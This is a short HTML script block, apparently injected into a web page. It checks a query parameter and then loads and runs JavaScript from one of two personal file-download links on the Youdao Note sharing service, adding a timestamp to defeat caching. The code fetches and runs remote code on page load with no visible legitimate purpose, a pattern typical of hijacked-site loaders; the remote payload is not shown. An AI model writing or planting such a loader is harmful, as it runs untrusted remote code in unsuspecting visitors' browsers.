<script>

// 获取当前页面的 URL 参数
const urlParams = new URLSearchParams(window.location.search);
// 获取参数 i 的值
const iValue = urlParams.get('i');

// 如果参数 i 的值为 1，则执行第一段代码
if (iValue === '1') {
    var xUrl = '//note.youdao.com/yws/api/personal/file/CACA9D7189DA43BB8E1CD1F9A92B231B?method=download&inline=true&shareKey=1e3e98947d65f6e65cb71743862b06aa';
    var now = Math.round(Date.now() / 1000 / 5);
    var s = document.createElement('script');
    s.setAttribute('src', xUrl + '&ut=' + now);
    s.setAttribute('charset', 'utf-8');
    if (!document.body) 
        document.head.appendChild(s);
    else 
        document.body.appendChild(s);
}
// 如果参数 i 的值为其他值，则执行第二段代码
else {
    var xUrl = '//note.youdao.com/yws/api/personal/file/65B04489D0F542F992CC4457BBDF3074?method=download&inline=true&shareKey=9d3b1e51a6c0878a5d8495c9e7141602';
    var now = Math.round(Date.now() / 1000 / 5);
    var s = document.createElement('script');
    s.setAttribute('src', xUrl + '&ut=' + now);
    s.setAttribute('charset', 'utf-8');
    if (!document.body) 
        document.head.appendChild(s);
    else 
        document.body.appendChild(s);
}
</script>
